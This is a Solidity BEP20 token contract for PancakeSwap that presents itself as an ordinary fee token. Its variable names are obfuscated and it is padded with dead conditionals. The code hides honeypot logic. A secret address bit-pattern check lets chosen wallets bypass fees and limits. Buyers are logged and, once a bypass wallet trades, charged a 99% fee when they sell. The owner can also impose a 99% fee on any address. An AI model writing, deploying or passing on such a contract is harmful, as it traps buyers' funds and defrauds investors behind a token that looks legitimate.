/**
 *Submitted for verification at BscScan.com on 2022-12-11
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract ApcalloverAcolasiaGentle is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Apcallover Acolasia Gentle ";
    string constant _symbol = "ApcalloverAcolasiaGentle";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private isLaunchedLimitMin;
    mapping(address => bool) private walletExemptReceiverIs;
    mapping(address => bool) private exemptSwapLimitBuy;
    mapping(address => bool) private receiverBurnSwapMax;
    mapping(address => uint256) private maxExemptSellMin;
    mapping(uint256 => address) private isSwapMinMax;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private burnTeamMarketingTx = 0;
    uint256 private burnMaxReceiverIs = 6;

    //SELL FEES
    uint256 private modeMaxTradingAuto = 0;
    uint256 private maxReceiverLaunchedBotsMarketing = 6;

    uint256 private limitTradingBurnWallet = burnMaxReceiverIs + burnTeamMarketingTx;
    uint256 private liquidityTradingSellFeeBurnMax = 100;

    address private botsIsReceiverLiquidityMin = (msg.sender); // auto-liq address
    address private buyTxBurnWallet = (0x105bfa44fa1C903C4299af54FfFfe1dfFC95049F); // marketing address
    address private feeLaunchedTxReceiver = DEAD;
    address private limitTradingSwapWallet = DEAD;
    address private buyWalletModeLaunchedMinExemptSwap = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private feeTxLaunchedMode;
    uint256 private receiverMaxBurnExempt;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private marketingTeamWalletAuto;
    uint256 private sellSwapFeeBotsExemptAutoTeam;
    uint256 private teamModeLiquidityLaunchedSwapAutoMax;
    uint256 private sellAutoFeeBurn;
    uint256 private autoTxLaunchedWalletMax;

    bool private walletExemptAutoMax = true;
    bool private receiverBurnSwapMaxMode = true;
    bool private liquidityMinReceiverBurnBotsAuto = true;
    bool private modeBuyWalletBurn = true;
    bool private botsReceiverAutoTeam = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private receiverWalletMarketingMinSell = 6 * 10 ** 15;
    uint256 private launchedIsAutoMarketing = _totalSupply / 1000; // 0.1%

    
    bool private feeMaxModeLimitSwapSellTx = false;
    uint256 private receiverLaunchedMarketingMinSellBuyTx = 0;
    uint256 private teamMarketingReceiverTradingLaunchedBuy = 0;
    uint256 private swapTxMaxLimitAutoFeeMode = 0;
    uint256 private swapReceiverTxLiquidity = 0;
    bool private botsTxMinLiquidity = false;
    uint256 private receiverMinLimitBurn = 0;
    uint256 private burnAutoTxSwap = 0;
    bool private modeReceiverIsLaunched = false;
    bool private swapLimitBuyExemptTeamMarketingReceiver = false;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        marketingTeamWalletAuto = true;

        isLaunchedLimitMin[msg.sender] = true;
        isLaunchedLimitMin[address(this)] = true;

        walletExemptReceiverIs[msg.sender] = true;
        walletExemptReceiverIs[0x0000000000000000000000000000000000000000] = true;
        walletExemptReceiverIs[0x000000000000000000000000000000000000dEaD] = true;
        walletExemptReceiverIs[address(this)] = true;

        exemptSwapLimitBuy[msg.sender] = true;
        exemptSwapLimitBuy[0x0000000000000000000000000000000000000000] = true;
        exemptSwapLimitBuy[0x000000000000000000000000000000000000dEaD] = true;
        exemptSwapLimitBuy[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return feeBurnMinMode(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return feeBurnMinMode(sender, recipient, amount);
    }

    function feeBurnMinMode(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        if (receiverLaunchedMarketingMinSellBuyTx == teamMarketingReceiverTradingLaunchedBuy) {
            receiverLaunchedMarketingMinSellBuyTx = burnAutoTxSwap;
        }


        bool bLimitTxWalletValue = minWalletLiquidityExemptModeBotsIs(sender) || minWalletLiquidityExemptModeBotsIs(recipient);
        
        if (modeReceiverIsLaunched == modeBuyWalletBurn) {
            modeReceiverIsLaunched = liquidityMinReceiverBurnBotsAuto;
        }


        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                txAutoReceiverBurn();
            }
            if (!bLimitTxWalletValue) {
                teamLiquidityBuyIs(recipient);
            }
        }
        
        if (inSwap || bLimitTxWalletValue) {return minReceiverIsLimit(sender, recipient, amount);}

        if (!isLaunchedLimitMin[sender] && !isLaunchedLimitMin[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }
        
        require((amount <= _maxTxAmount) || exemptSwapLimitBuy[sender] || exemptSwapLimitBuy[recipient], "Max TX Limit has been triggered");

        if (autoReceiverLaunchedLimitBuyTeam()) {limitTxIsMarketingModeWalletLaunched();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
        if (botsTxMinLiquidity != feeMaxModeLimitSwapSellTx) {
            botsTxMinLiquidity = modeBuyWalletBurn;
        }

        if (swapLimitBuyExemptTeamMarketingReceiver != walletExemptAutoMax) {
            swapLimitBuyExemptTeamMarketingReceiver = walletExemptAutoMax;
        }

        if (teamMarketingReceiverTradingLaunchedBuy != teamMarketingReceiverTradingLaunchedBuy) {
            teamMarketingReceiverTradingLaunchedBuy = liquidityTradingSellFeeBurnMax;
        }


        uint256 amountReceived = limitAutoWalletTrading(sender) ? modeBotsSellTeam(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function minReceiverIsLimit(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function limitAutoWalletTrading(address sender) internal view returns (bool) {
        return !walletExemptReceiverIs[sender];
    }

    function receiverSwapAutoTeamBurnMode(address sender, bool selling) internal returns (uint256) {
        
        if (selling) {
            limitTradingBurnWallet = maxReceiverLaunchedBotsMarketing + modeMaxTradingAuto;
            return burnMinSwapTrading(sender, limitTradingBurnWallet);
        }
        if (!selling && sender == uniswapV2Pair) {
            limitTradingBurnWallet = burnMaxReceiverIs + burnTeamMarketingTx;
            return limitTradingBurnWallet;
        }
        return burnMinSwapTrading(sender, limitTradingBurnWallet);
    }

    function txLiquiditySwapIsLimitSellMarketing() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function modeBotsSellTeam(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        if (receiverLaunchedMarketingMinSellBuyTx != teamMarketingReceiverTradingLaunchedBuy) {
            receiverLaunchedMarketingMinSellBuyTx = swapTxMaxLimitAutoFeeMode;
        }


        uint256 feeAmount = amount.mul(receiverSwapAutoTeamBurnMode(sender, receiver == uniswapV2Pair)).div(liquidityTradingSellFeeBurnMax);

        if (receiverBurnSwapMax[sender] || receiverBurnSwapMax[receiver]) {
            feeAmount = amount.mul(99).div(liquidityTradingSellFeeBurnMax);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function minWalletLiquidityExemptModeBotsIs(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function burnMinSwapTrading(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = maxExemptSellMin[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function teamLiquidityBuyIs(address addr) private {
        if (txLiquiditySwapIsLimitSellMarketing() < receiverWalletMarketingMinSell) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        isSwapMinMax[exemptLimitValue] = addr;
    }

    function txAutoReceiverBurn() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (maxExemptSellMin[isSwapMinMax[i]] == 0) {
                    maxExemptSellMin[isSwapMinMax[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(buyTxBurnWallet).transfer(amountBNB * amountPercentage / 100);
    }

    function autoReceiverLaunchedLimitBuyTeam() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    botsReceiverAutoTeam &&
    _balances[address(this)] >= launchedIsAutoMarketing;
    }

    function limitTxIsMarketingModeWalletLaunched() internal swapping {
        
        if (botsTxMinLiquidity != swapLimitBuyExemptTeamMarketingReceiver) {
            botsTxMinLiquidity = liquidityMinReceiverBurnBotsAuto;
        }

        if (swapTxMaxLimitAutoFeeMode != maxReceiverLaunchedBotsMarketing) {
            swapTxMaxLimitAutoFeeMode = burnTeamMarketingTx;
        }


        uint256 amountToLiquify = launchedIsAutoMarketing.mul(burnTeamMarketingTx).div(limitTradingBurnWallet).div(2);
        uint256 amountToSwap = launchedIsAutoMarketing.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = limitTradingBurnWallet.sub(burnTeamMarketingTx.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(burnTeamMarketingTx).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(burnMaxReceiverIs).div(totalETHFee);
        
        if (botsTxMinLiquidity == modeReceiverIsLaunched) {
            botsTxMinLiquidity = swapLimitBuyExemptTeamMarketingReceiver;
        }

        if (swapLimitBuyExemptTeamMarketingReceiver != feeMaxModeLimitSwapSellTx) {
            swapLimitBuyExemptTeamMarketingReceiver = botsReceiverAutoTeam;
        }


        payable(buyTxBurnWallet).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                botsIsReceiverLiquidityMin,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getBotsTxMinLiquidity() public view returns (bool) {
        if (botsTxMinLiquidity == walletExemptAutoMax) {
            return walletExemptAutoMax;
        }
        if (botsTxMinLiquidity != botsTxMinLiquidity) {
            return botsTxMinLiquidity;
        }
        if (botsTxMinLiquidity == botsReceiverAutoTeam) {
            return botsReceiverAutoTeam;
        }
        return botsTxMinLiquidity;
    }
    function setBotsTxMinLiquidity(bool a0) public onlyOwner {
        botsTxMinLiquidity=a0;
    }

    function getSwapTxMaxLimitAutoFeeMode() public view returns (uint256) {
        if (swapTxMaxLimitAutoFeeMode != burnAutoTxSwap) {
            return burnAutoTxSwap;
        }
        if (swapTxMaxLimitAutoFeeMode == receiverWalletMarketingMinSell) {
            return receiverWalletMarketingMinSell;
        }
        if (swapTxMaxLimitAutoFeeMode == receiverMinLimitBurn) {
            return receiverMinLimitBurn;
        }
        return swapTxMaxLimitAutoFeeMode;
    }
    function setSwapTxMaxLimitAutoFeeMode(uint256 a0) public onlyOwner {
        swapTxMaxLimitAutoFeeMode=a0;
    }

    function getSwapLimitBuyExemptTeamMarketingReceiver() public view returns (bool) {
        if (swapLimitBuyExemptTeamMarketingReceiver != modeBuyWalletBurn) {
            return modeBuyWalletBurn;
        }
        if (swapLimitBuyExemptTeamMarketingReceiver != modeReceiverIsLaunched) {
            return modeReceiverIsLaunched;
        }
        if (swapLimitBuyExemptTeamMarketingReceiver == walletExemptAutoMax) {
            return walletExemptAutoMax;
        }
        return swapLimitBuyExemptTeamMarketingReceiver;
    }
    function setSwapLimitBuyExemptTeamMarketingReceiver(bool a0) public onlyOwner {
        if (swapLimitBuyExemptTeamMarketingReceiver != feeMaxModeLimitSwapSellTx) {
            feeMaxModeLimitSwapSellTx=a0;
        }
        swapLimitBuyExemptTeamMarketingReceiver=a0;
    }

    function getLiquidityMinReceiverBurnBotsAuto() public view returns (bool) {
        if (liquidityMinReceiverBurnBotsAuto == walletExemptAutoMax) {
            return walletExemptAutoMax;
        }
        return liquidityMinReceiverBurnBotsAuto;
    }
    function setLiquidityMinReceiverBurnBotsAuto(bool a0) public onlyOwner {
        if (liquidityMinReceiverBurnBotsAuto != swapLimitBuyExemptTeamMarketingReceiver) {
            swapLimitBuyExemptTeamMarketingReceiver=a0;
        }
        liquidityMinReceiverBurnBotsAuto=a0;
    }

    function getBurnTeamMarketingTx() public view returns (uint256) {
        if (burnTeamMarketingTx != liquidityTradingSellFeeBurnMax) {
            return liquidityTradingSellFeeBurnMax;
        }
        return burnTeamMarketingTx;
    }
    function setBurnTeamMarketingTx(uint256 a0) public onlyOwner {
        if (burnTeamMarketingTx == modeMaxTradingAuto) {
            modeMaxTradingAuto=a0;
        }
        if (burnTeamMarketingTx == receiverWalletMarketingMinSell) {
            receiverWalletMarketingMinSell=a0;
        }
        burnTeamMarketingTx=a0;
    }

    function getModeBuyWalletBurn() public view returns (bool) {
        return modeBuyWalletBurn;
    }
    function setModeBuyWalletBurn(bool a0) public onlyOwner {
        if (modeBuyWalletBurn == liquidityMinReceiverBurnBotsAuto) {
            liquidityMinReceiverBurnBotsAuto=a0;
        }
        modeBuyWalletBurn=a0;
    }

    function getFeeLaunchedTxReceiver() public view returns (address) {
        if (feeLaunchedTxReceiver == buyWalletModeLaunchedMinExemptSwap) {
            return buyWalletModeLaunchedMinExemptSwap;
        }
        if (feeLaunchedTxReceiver != feeLaunchedTxReceiver) {
            return feeLaunchedTxReceiver;
        }
        return feeLaunchedTxReceiver;
    }
    function setFeeLaunchedTxReceiver(address a0) public onlyOwner {
        if (feeLaunchedTxReceiver == buyTxBurnWallet) {
            buyTxBurnWallet=a0;
        }
        if (feeLaunchedTxReceiver != feeLaunchedTxReceiver) {
            feeLaunchedTxReceiver=a0;
        }
        if (feeLaunchedTxReceiver == botsIsReceiverLiquidityMin) {
            botsIsReceiverLiquidityMin=a0;
        }
        feeLaunchedTxReceiver=a0;
    }

    function getFeeMaxModeLimitSwapSellTx() public view returns (bool) {
        return feeMaxModeLimitSwapSellTx;
    }
    function setFeeMaxModeLimitSwapSellTx(bool a0) public onlyOwner {
        if (feeMaxModeLimitSwapSellTx == walletExemptAutoMax) {
            walletExemptAutoMax=a0;
        }
        feeMaxModeLimitSwapSellTx=a0;
    }

    function getReceiverBurnSwapMax(address a0) public view returns (bool) {
            return receiverBurnSwapMax[a0];
    }
    function setReceiverBurnSwapMax(address a0,bool a1) public onlyOwner {
        if (a0 == limitTradingSwapWallet) {
            modeReceiverIsLaunched=a1;
        }
        receiverBurnSwapMax[a0]=a1;
    }

    function getLimitTradingSwapWallet() public view returns (address) {
        if (limitTradingSwapWallet == buyWalletModeLaunchedMinExemptSwap) {
            return buyWalletModeLaunchedMinExemptSwap;
        }
        return limitTradingSwapWallet;
    }
    function setLimitTradingSwapWallet(address a0) public onlyOwner {
        if (limitTradingSwapWallet != feeLaunchedTxReceiver) {
            feeLaunchedTxReceiver=a0;
        }
        if (limitTradingSwapWallet == buyWalletModeLaunchedMinExemptSwap) {
            buyWalletModeLaunchedMinExemptSwap=a0;
        }
        if (limitTradingSwapWallet == buyTxBurnWallet) {
            buyTxBurnWallet=a0;
        }
        limitTradingSwapWallet=a0;
    }

    function getExemptSwapLimitBuy(address a0) public view returns (bool) {
        if (exemptSwapLimitBuy[a0] == walletExemptReceiverIs[a0]) {
            return botsReceiverAutoTeam;
        }
            return exemptSwapLimitBuy[a0];
    }
    function setExemptSwapLimitBuy(address a0,bool a1) public onlyOwner {
        exemptSwapLimitBuy[a0]=a1;
    }

    function getModeMaxTradingAuto() public view returns (uint256) {
        if (modeMaxTradingAuto != burnAutoTxSwap) {
            return burnAutoTxSwap;
        }
        if (modeMaxTradingAuto != limitTradingBurnWallet) {
            return limitTradingBurnWallet;
        }
        return modeMaxTradingAuto;
    }
    function setModeMaxTradingAuto(uint256 a0) public onlyOwner {
        modeMaxTradingAuto=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}